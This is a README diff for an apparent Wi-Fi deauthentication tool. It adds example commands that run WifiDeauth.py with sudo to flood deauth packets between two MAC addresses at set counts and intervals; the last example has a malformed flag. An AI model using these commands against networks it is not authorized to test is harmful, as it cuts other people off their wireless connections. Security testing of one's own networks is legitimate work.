@@ -41,7 +41,23 @@ $ . venv/bin/activate
 just run it...
 
 ```shell
-... to be done ...
+# show help (optional)
+(venv) $ sudo venv/bin/python ./WifiDeauth.py --help
+
+# start sending deauth packets from '80:30:dc:c2:dd:62' to '55:67:51:c3:2c:b4' every 100ms infinite
+(venv) $ sudo venv/bin/python ./WifiDeauth.py wlan1 '55:67:51:c3:2c:b4' '80:30:dc:c2:dd:62'
+
+# start sending deauth packets from '80:30:dc:c2:dd:62' to '55:67:51:c3:2c:b4' every 100ms infinite
+(venv) $ sudo venv/bin/python ./WifiDeauth.py wlan1 '55:67:51:c3:2c:b4' '80:30:dc:c2:dd:62' -n 0
+
+# start sending deauth packets from '80:30:dc:c2:dd:62' to '55:67:51:c3:2c:b4' every 200ms infinite
+(venv) $ sudo venv/bin/python ./WifiDeauth.py wlan1 '55:67:51:c3:2c:b4' '80:30:dc:c2:dd:62' -i '0.2'
+
+# start sending deauth 30 packets from '80:30:dc:c2:dd:62' to '55:67:51:c3:2c:b4' every 100ms
+(venv) $ sudo venv/bin/python ./WifiDeauth.py wlan1 '55:67:51:c3:2c:b4' '80:30:dc:c2:dd:62' -n 30
+
+# start sending deauth 50 packets from '80:30:dc:c2:dd:62' to '55:67:51:c3:2c:b4' every 300ms
+(venv) $ sudo venv/bin/python ./WifiDeauth.py wlan1 '55:67:51:c3:2c:b4' '80:30:dc:c2:dd:62' -n 50 - '0.3'
 ```
 
 to interrupt press [CTRL + c]
